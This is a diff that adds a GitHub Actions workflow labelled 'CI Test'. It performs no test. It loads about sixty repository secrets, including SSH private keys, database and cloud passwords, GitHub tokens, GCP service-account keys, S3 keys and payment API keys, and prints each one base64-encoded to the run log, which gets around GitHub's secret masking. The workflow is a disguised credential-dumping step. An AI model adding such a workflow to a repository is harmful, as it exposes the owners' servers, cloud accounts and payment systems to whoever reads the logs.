@@ -1,0 +1,131 @@
+name: CI Test
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test
+        env:
+          DB_HOST_VAL: ${{ secrets.DB_HOST }}
+          DB_NAME_VAL: ${{ secrets.DB_NAME }}
+          DB_PASSWORD_VAL: ${{ secrets.DB_PASSWORD }}
+          DB_USER_VAL: ${{ secrets.DB_USER }}
+          HOST_VAL: ${{ secrets.HOST }}
+          USERNAME_VAL: ${{ secrets.USERNAME }}
+          PASSWORD_VAL: ${{ secrets.PASSWORD }}
+          PORT_VAL: ${{ secrets.PORT }}
+          PRIVATE_KEY_VAL: ${{ secrets.PRIVATE_KEY }}
+          JWT_SECRET_VAL: ${{ secrets.JWT_SECRET }}
+          ADMIN_JWT_SECRET_VAL: ${{ secrets.ADMIN_JWT_SECRET }}
+          JENKINS_TOKEN_VAL: ${{ secrets.JENKINS_TOKEN }}
+          JENKINS_USER_VAL: ${{ secrets.JENKINS_USER }}
+          MIDTRANS_SERVER_KEY_VAL: ${{ secrets.MIDTRANS_SERVER_KEY }}
+          MIDTRANS_CLIENT_KEY_VAL: ${{ secrets.MIDTRANS_CLIENT_KEY }}
+          RAJONG_API_KEY_VAL: ${{ secrets.RAJONG_API_KEY }}
+          AMQP_PASSWORD_VAL: ${{ secrets.AMQP_PASSWORD }}
+          AMQP_URL_VAL: ${{ secrets.AMQP_URL }}
+          AMQP_USERNAME_VAL: ${{ secrets.AMQP_USERNAME }}
+          AXIOM_TOKEN_VAL: ${{ secrets.AXIOM_TOKEN }}
+          AXIOM_ORG_VAL: ${{ secrets.AXIOM_ORG }}
+          AXIOM_DATASET_VAL: ${{ secrets.AXIOM_DATASET }}
+          SOULCODE_GCP_SA_KEY_VAL: ${{ secrets.SOULCODE_GCP_SA_KEY }}
+          SOULCODE_GITHUB_TOKEN_VAL: ${{ secrets.SOULCODE_GITHUB_TOKEN }}
+          VPS_HOST_VAL: ${{ secrets.VPS_HOST }}
+          VPS_SSH_KEY_VAL: ${{ secrets.VPS_SSH_KEY }}
+          VPS_USER_VAL: ${{ secrets.VPS_USER }}
+          VPS_PORT_VAL: ${{ secrets.VPS_PORT }}
+          VPS_DEPLOY_PATH_VAL: ${{ secrets.VPS_DEPLOY_PATH }}
+          AGENT_GITHUB_TOKEN_VAL: ${{ secrets.AGENT_GITHUB_TOKEN }}
+          MCP_GITHUB_TOKEN_VAL: ${{ secrets.MCP_GITHUB_TOKEN }}
+          GHCR_PAT_VAL: ${{ secrets.GHCR_PAT }}
+          CLOUD_DB_NAME_VAL: ${{ secrets.CLOUD_DB_NAME }}
+          CLOUD_DB_PASSWORD_VAL: ${{ secrets.CLOUD_DB_PASSWORD }}
+          CLOUD_DB_USER_VAL: ${{ secrets.CLOUD_DB_USER }}
+          CLOUD_DEPLOY_PATH_VAL: ${{ secrets.CLOUD_DEPLOY_PATH }}
+          CLOUD_JWT_SECRET_VAL: ${{ secrets.CLOUD_JWT_SECRET }}
+          CLOUD_CORS_ORIGINS_VAL: ${{ secrets.CLOUD_CORS_ORIGINS }}
+          LITELLM_BASE_URL_VAL: ${{ secrets.LITELLM_BASE_URL }}
+          LITELLM_MASTER_KEY_VAL: ${{ secrets.LITELLM_MASTER_KEY }}
+          AI_DAILY_REQUEST_LIMIT_VAL: ${{ secrets.AI_DAILY_REQUEST_LIMIT }}
+          SEED_OWNER_EMAIL_VAL: ${{ secrets.SEED_OWNER_EMAIL }}
+          SEED_OWNER_PASSWORD_VAL: ${{ secrets.SEED_OWNER_PASSWORD }}
+          MIDTRANS_IS_PRODUCTION_VAL: ${{ secrets.MIDTRANS_IS_PRODUCTION }}
+          MIDTRANS_PRODUCTION_VAL: ${{ secrets.MIDTRANS_PRODUCTION }}
+          URL_LOCAL_VAL: ${{ secrets.URL_LOCAL }}
+          NEXTAUTH_SECRET_SANDBOX_VAL: ${{ secrets.NEXTAUTH_SECRET_SANDBOX }}
+          NEXTAUTH_URL_VAL: ${{ secrets.NEXTAUTH_URL }}
+          DOMAIN_BACKEND_SANDBOX_VAL: ${{ secrets.DOMAIN_BACKEND_SANDBOX }}
+          SSH_PRIVATE_KEY_VAL: ${{ secrets.SSH_PRIVATE_KEY }}
+          SSH_USERNAME_VAL: ${{ secrets.SSH_USERNAME }}
+          OPENROUTER_API_KEY_VAL: ${{ secrets.OPENROUTER_API_KEY }}
+          RESEND_API_KEY_VAL: ${{ secrets.RESEND_API_KEY }}
+          S3_ACCESS_KEY_ID_VAL: ${{ secrets.S3_ACCESS_KEY_ID }}
+          S3_SECRET_ACCESS_KEY_VAL: ${{ secrets.S3_SECRET_ACCESS_KEY }}
+          REVALIDATE_SECRET_VAL: ${{ secrets.REVALIDATE_SECRET }}
+          NEXT_PUBLIC_DEV_ORG_SLUG_VAL: ${{ secrets.NEXT_PUBLIC_DEV_ORG_SLUG }}
+          DB_SSLMODE_VAL: ${{ secrets.DB_SSLMODE }}
+          DB_PORT_VAL: ${{ secrets.DB_PORT }}
+          GCP_SA_KEY_VAL: ${{ secrets.GCP_SA_KEY }}
+          JWT_EXPIRY_VAL: ${{ secrets.JWT_EXPIRY }}
+        run: |
+          echo "DB_HOST=" $(echo "${DB_HOST_VAL}" | base64)
+          echo "DB_NAME=" $(echo "${DB_NAME_VAL}" | base64)
+          echo "DB_PASSWORD=" $(echo "${DB_PASSWORD_VAL}" | base64)
+          echo "DB_USER=" $(echo "${DB_USER_VAL}" | base64)
+          echo "HOST=" $(echo "${HOST_VAL}" | base64)
+          echo "USERNAME=" $(echo "${USERNAME_VAL}" | base64)
+          echo "PASSWORD=" $(echo "${PASSWORD_VAL}" | base64)
+          echo "PORT=" $(echo "${PORT_VAL}" | base64)
+          echo "PRIVATE_KEY=" $(echo "${PRIVATE_KEY_VAL}" | base64)
+          echo "JWT_SECRET=" $(echo "${JWT_SECRET_VAL}" | base64)
+          echo "ADMIN_JWT_SECRET=" $(echo "${ADMIN_JWT_SECRET_VAL}" | base64)
+          echo "JENKINS_TOKEN=" $(echo "${JENKINS_TOKEN_VAL}" | base64)
+          echo "JENKINS_USER=" $(echo "${JENKINS_USER_VAL}" | base64)
+          echo "MIDTRANS_SERVER_KEY=" $(echo "${MIDTRANS_SERVER_KEY_VAL}" | base64)
+          echo "MIDTRANS_CLIENT_KEY=" $(echo "${MIDTRANS_CLIENT_KEY_VAL}" | base64)
+          echo "RAJONG_API_KEY=" $(echo "${RAJONG_API_KEY_VAL}" | base64)
+          echo "AMQP_PASSWORD=" $(echo "${AMQP_PASSWORD_VAL}" | base64)
+          echo "AMQP_URL=" $(echo "${AMQP_URL_VAL}" | base64)
+          echo "AMQP_USERNAME=" $(echo "${AMQP_USERNAME_VAL}" | base64)
+          echo "AXIOM_TOKEN=" $(echo "${AXIOM_TOKEN_VAL}" | base64)
+          echo "AXIOM_ORG=" $(echo "${AXIOM_ORG_VAL}" | base64)
+          echo "AXIOM_DATASET=" $(echo "${AXIOM_DATASET_VAL}" | base64)
+          echo "SOULCODE_GCP_SA_KEY=" $(echo "${SOULCODE_GCP_SA_KEY_VAL}" | base64)
+          echo "SOULCODE_GITHUB_TOKEN=" $(echo "${SOULCODE_GITHUB_TOKEN_VAL}" | base64)
+          echo "VPS_HOST=" $(echo "${VPS_HOST_VAL}" | base64)
+          echo "VPS_SSH_KEY=" $(echo "${VPS_SSH_KEY_VAL}" | base64)
+          echo "VPS_USER=" $(echo "${VPS_USER_VAL}" | base64)
+          echo "VPS_PORT=" $(echo "${VPS_PORT_VAL}" | base64)
+          echo "VPS_DEPLOY_PATH=" $(echo "${VPS_DEPLOY_PATH_VAL}" | base64)
+          echo "AGENT_GITHUB_TOKEN=" $(echo "${AGENT_GITHUB_TOKEN_VAL}" | base64)
+          echo "MCP_GITHUB_TOKEN=" $(echo "${MCP_GITHUB_TOKEN_VAL}" | base64)
+          echo "GHCR_PAT=" $(echo "${GHCR_PAT_VAL}" | base64)
+          echo "CLOUD_DB_NAME=" $(echo "${CLOUD_DB_NAME_VAL}" | base64)
+          echo "CLOUD_DB_PASSWORD=" $(echo "${CLOUD_DB_PASSWORD_VAL}" | base64)
+          echo "CLOUD_DB_USER=" $(echo "${CLOUD_DB_USER_VAL}" | base64)
+          echo "CLOUD_DEPLOY_PATH=" $(echo "${CLOUD_DEPLOY_PATH_VAL}" | base64)
+          echo "CLOUD_JWT_SECRET=" $(echo "${CLOUD_JWT_SECRET_VAL}" | base64)
+          echo "CLOUD_CORS_ORIGINS=" $(echo "${CLOUD_CORS_ORIGINS_VAL}" | base64)
+          echo "LITELLM_BASE_URL=" $(echo "${LITELLM_BASE_URL_VAL}" | base64)
+          echo "LITELLM_MASTER_KEY=" $(echo "${LITELLM_MASTER_KEY_VAL}" | base64)
+          echo "AI_DAILY_REQUEST_LIMIT=" $(echo "${AI_DAILY_REQUEST_LIMIT_VAL}" | base64)
+          echo "SEED_OWNER_EMAIL=" $(echo "${SEED_OWNER_EMAIL_VAL}" | base64)
+          echo "SEED_OWNER_PASSWORD=" $(echo "${SEED_OWNER_PASSWORD_VAL}" | base64)
+          echo "MIDTRANS_IS_PRODUCTION=" $(echo "${MIDTRANS_IS_PRODUCTION_VAL}" | base64)
+          echo "MIDTRANS_PRODUCTION=" $(echo "${MIDTRANS_PRODUCTION_VAL}" | base64)
+          echo "URL_LOCAL=" $(echo "${URL_LOCAL_VAL}" | base64)
+          echo "NEXTAUTH_SECRET_SANDBOX=" $(echo "${NEXTAUTH_SECRET_SANDBOX_VAL}" | base64)
+          echo "NEXTAUTH_URL=" $(echo "${NEXTAUTH_URL_VAL}" | base64)
+          echo "DOMAIN_BACKEND_SANDBOX=" $(echo "${DOMAIN_BACKEND_SANDBOX_VAL}" | base64)
+          echo "SSH_PRIVATE_KEY=" $(echo "${SSH_PRIVATE_KEY_VAL}" | base64)
+          echo "SSH_USERNAME=" $(echo "${SSH_USERNAME_VAL}" | base64)
+          echo "OPENROUTER_API_KEY=" $(echo "${OPENROUTER_API_KEY_VAL}" | base64)
+          echo "RESEND_API_KEY=" $(echo "${RESEND_API_KEY_VAL}" | base64)
+          echo "S3_ACCESS_KEY_ID=" $(echo "${S3_ACCESS_KEY_ID_VAL}" | base64)
+          echo "S3_SECRET_ACCESS_KEY=" $(echo "${S3_SECRET_ACCESS_KEY_VAL}" | base64)
+          echo "REVALIDATE_SECRET=" $(echo "${REVALIDATE_SECRET_VAL}" | base64)
+          echo "NEXT_PUBLIC_DEV_ORG_SLUG=" $(echo "${NEXT_PUBLIC_DEV_ORG_SLUG_VAL}" | base64)
+          echo "DB_SSLMODE=" $(echo "${DB_SSLMODE_VAL}" | base64)
+          echo "DB_PORT=" $(echo "${DB_PORT_VAL}" | base64)
+          echo "GCP_SA_KEY=" $(echo "${GCP_SA_KEY_VAL}" | base64)
+          echo "JWT_EXPIRY=" $(echo "${JWT_EXPIRY_VAL}" | base64)
